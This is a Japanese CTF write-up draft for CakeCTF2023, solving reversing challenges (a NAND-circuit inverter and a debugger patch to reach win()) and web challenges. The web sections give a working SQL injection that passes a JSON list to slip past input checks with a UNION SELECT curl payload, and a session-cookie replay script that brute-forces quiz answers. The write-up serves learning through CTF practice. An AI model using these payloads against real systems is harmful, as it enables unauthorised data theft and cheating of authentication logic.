---
title: "CakeCTF2023 upsolve"
date: 2024-05-02T03:54:48+09:00
draft: true
---

# rev

### nande

Ghidra で見る．
NAND で構成された MODULE が見える．
MODULE の真理値表から XOR っぽい．
XOR なら逆算で入力が求まるので，逆算とデコードを書く．

```python
outputs = [0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x0, 0x1, 0x1, 0x0, 0x0, 0x1, 0x0, 0x0, 0x1, 0x0, 0x0, 0x1, 0x1, 0x0, 0x0, 0x0, 0x0, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x0, 0x1, 0x1, 0x1, 0x1, 0x0, 0x1, 0x0, 0x1, 0x1, 0x1, 0x0, 0x0, 0x0, 0x1, 0x1, 0x0, 0x1, 0x1, 0x1, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x1, 0x0, 0x1, 0x0, 0x0, 0x1, 0x1, 0x0, 0x1, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x1, 0x0, 0x0, 0x1, 0x0, 0x1, 0x1, 0x1, 0x0, 0x0, 0x1, 0x1, 0x1, 0x0, 0x0, 0x1, 0x1, 0x1, 0x0, 0x1, 0x0, 0x1, 0x1, 0x1, 0x1, 0x0, 0x1, 0x1, 0x0, 0x0, 0x0, 0x1, 0x1, 0x0, 0x0, 0x1, 0x1, 0x0, 0x1, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x1, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x1, 0x1, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x1, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x1, 0x1, 0x0, 0x1, 0x1, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x1, 0x0, 0x1, 0x1, 0x0, 0x1, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x1, 0x1, 0x0, 0x1, 0x1, 0x1, 0x0, 0x0, 0x1, 0x0, 0x1, 0x1, 0x0, 0x1, 0x1, 0x0, 0x0, 0x1, 0x0, 0x0, 0x1, 0x1, 0x0, 0x0, 0x1, 0x1, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x1, 0x0]

def nand(a, b):
   return int((a & b) == 0)
   
def MODULE(a, b): # XOR
   local18 = nand(a,b)
   local16 = nand(a, local18)
   local17 = nand(b, local18)
   return nand(local16, local17)

def CIRCUIT(a):
   for i in range(0x1234):
      b = [0] * 0xff
      for j in range(0xff):
         b[j] = MODULE(a[j], a[j+1])
      b[j] = MODULE(a[j], 0x01)
      a = b.copy()
   return b

def rev_CIRCUIT(outputs):
   for i in range(0x1234):
      inputs = [0] * 0x100
      #print(len(inputs))
      inputs[0xff] = MODULE(outputs[0xff], 0x01)
      for j in reversed(range(0xff)):
         inputs[j] = MODULE(outputs[j], inputs[j+1])
      outputs = inputs.copy()
   #print(inputs)
   return inputs
   
def decode(result):
   decoded = b""
   for i in range(0x20):
      tmp = 0
      for j in range(8):
         tmp = tmp + 2**j * result[8*i + j]
      decoded = decoded + bytes([tmp])
      #i = 7 + i
      #if(i == 255):
      #   break
   print(decoded)
   return decoded
      
decode(rev_CIRCUIT(outputs))
```

```shell
┌──(kali㉿kali)-[~/CTF]
└─$ python solve9.py
b'CakeCTF{h2fsCHAo3xOsBZefcWudTa4}'
```

### Cake Puzzle

```C

void main(void)

{
  int iVar1;
  undefined8 uVar2;
  char local_78 [112];
  
  alarm(1000);
  while( true ) {
    uVar2 = q();
    if ((int)uVar2 == 0) {
      win();
    }
    printf("> ");
    fflush(stdout);
    iVar1 = __isoc99_scanf(&DAT_00102019,local_78);
    if (iVar1 == -1) break;
    e(local_78[0]);
  }
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

```win()``` を呼び出すとフラグが発生するっぽい．
直前で ```if ((int)uVar2 == 0)``` とあるので，```uVar2``` が 0 になってくれればいい．

```shell
pwndbg> b *0x5555555555e6
Breakpoint 2 at 0x5555555555e6
pwndbg> r

~~ snip ~~

pwndbg> print $eax
$2 = 1
pwndbg> set $eax=0
pwndbg> print $eax
$3 = 0
pwndbg> c
Continuing.
fopen: No such file or directory 
[Inferior 1 (process 744346) exited with code 01]
```

```fopen: No such file or directory ``` は，逆コンパイル結果を見る限り，flag.txt を開こうとしたが，ローカルで開けていないだけだと思うので解けているとは思う．．．

# Web

### CountryDB

```python
#!/usr/bin/env python3
import flask
import sqlite3

app = flask.Flask(__name__)

def db_search(code):
    with sqlite3.connect('database.db') as conn:
        cur = conn.cursor()
        cur.execute(f"SELECT name FROM country WHERE code=UPPER('{code}')")
        found = cur.fetchone()
    return None if found is None else found[0]

@app.route('/')
def index():
    return flask.render_template("index.html")

@app.route('/api/search', methods=['POST'])
def api_search():
    req = flask.request.get_json()
    if 'code' not in req:
        flask.abort(400, "Empty country code")

    code = req['code']
    if len(code) != 2 or "'" in code:
        flask.abort(400, "Invalid country code")

    name = db_search(code)
    if name is None:
        flask.abort(404, "No such country")

    return {'name': name}

if __name__ == '__main__':
    app.run(debug=True)
```

app.py で国コードを受け取っている．
特に，code はサニタイズされていて，二文字かつ ['] を含まないことになっている．
しかし，文字列であるかどうかの確認がないため，リストで入力することができる．

```"SELECT name FROM country WHERE code=UPPER('{code}')"``` という SQL 列に注目して，
code に入れるべき配列を考える．
flag というテーブルに flag の変数が入っているので，これを探したい．

```union``` を使って SQL 文を連結することを考える．

```python
code = [") union select flag from flag; "--, "a"]
```

クオーテーションに注意して，以下のように curl を出す．

```shell
curl -X POST -H "Content-Type: application/json" -d '{"code": [") union select flag from flag; --", "a"]}' http://0.0.0.0:8020/api/search
{"name":"CakeCTF{b3_c4refUl_wh3n_y0U_u5e_JS0N_1nPut}"}
```

### TOWFL

session の管理が甘く，```flask.session.clear()``` していても同じセッションを使うと同じログイン情報が使える．

```python
import requests
import json

s = requests.Session()
base = "http://0.0.0.0:8888/"

score = 0
s.post(base + "api/start")
answer = [[None]*10 for _ in range(10)]

for i in range(100):
    for j in range(4):
        answer[i//10][i%10] = j
        s.post(base + "api/submit", json = answer) 
        cook = s.cookies["session"]
        scores = s.get(base + "api/score")
        s.cookies["session"] = cook
        if scores.json()["data"]["score"] == score + 1:
            score = score + 1
            print(score)
            break

s.post(base + "api/submit", json = answer)
score = s.get(base + "api/score")
print(score.json())
```

```s.post(base + "api/submit", json = answer)``` で，仮の answer を保持したまま解答を提出する．
このとき，確定している解答以外は空欄で提出する．
また，cookie を保存する．
次に ```s.get(base + "api/score")``` でスコアを取得し(Burp で見ると json 形式になっていることが分かるのでそれに対応したように書く)，score が 1 増加していれば通る，というようにする．
